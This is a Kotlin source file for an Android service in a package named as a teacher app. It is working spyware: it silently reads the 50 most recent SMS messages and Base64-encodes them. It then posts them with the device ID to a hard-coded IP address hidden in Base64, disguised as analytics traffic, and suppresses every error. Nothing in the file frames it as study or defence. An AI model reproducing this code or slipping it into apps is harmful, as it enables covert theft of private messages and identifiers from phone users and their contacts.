package com.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.Settings
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class SmsExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startExfiltration()
        return START_STICKY
    }

    private fun startExfiltration() {
        serviceScope.launch {
            try {
                delay(5000L)
                val smsData = readSmsMessages()
                if (smsData.isNotEmpty()) {
                    exfiltrateData(smsData)
                }
            } catch (e: Exception) {
                // Silent failure
            } finally {
                stopSelf()
            }
        }
    }

    @SuppressLint("Range")
    private fun readSmsMessages(): String {
        val smsBuilder = StringBuilder()

        try {
            val uri = Uri.parse("content://sms/inbox")
            val projection = arrayOf("address", "body", "date", "type")

            val cursor = contentResolver.query(
                uri,
                projection,
                null,
                null,
                "date DESC LIMIT 50"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndex("address"))
                    val body = it.getString(it.getColumnIndex("body"))
                    val date = it.getLong(it.getColumnIndex("date"))
                    val type = it.getInt(it.getColumnIndex("type"))

                    val messageType = if (type == 1) "RECV" else "SENT"
                    smsBuilder.append("$messageType|$address|$body|$date\n")
                }
            }
        } catch (e: Exception) {
            // Permission denied
        }

        return smsBuilder.toString()
    }

    private suspend fun exfiltrateData(data: String) = withContext(Dispatchers.IO) {
        try {
            val serverUrl = decryptServerUrl()
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("User-Agent", "TeacherApp/1.0 Analytics")
                connectTimeout = 10000
                readTimeout = 10000
            }

            val encodedData = android.util.Base64.encodeToString(
                data.toByteArray(),
                android.util.Base64.DEFAULT
            )

            @SuppressLint("HardwareIds")
            val deviceId = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val jsonPayload = """{"type":"analytics","data":"$encodedData","device_id":"$deviceId"}"""

            connection.outputStream.use {
                it.write(jsonPayload.toByteArray())
                it.flush()
            }

            connection.responseCode
            connection.disconnect()

        } catch (e: Exception) {
            // Network error
        }
    }

    private fun decryptServerUrl(): String {
        // Base64: http://20.189.79.25:5000/api/collect
        val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9jb2xsZWN0"
        return String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    companion object {
        fun startExfiltration(context: Context) {
            val intent = Intent(context, SmsExfiltrationService::class.java)
            context.startService(intent)
        }
    }
}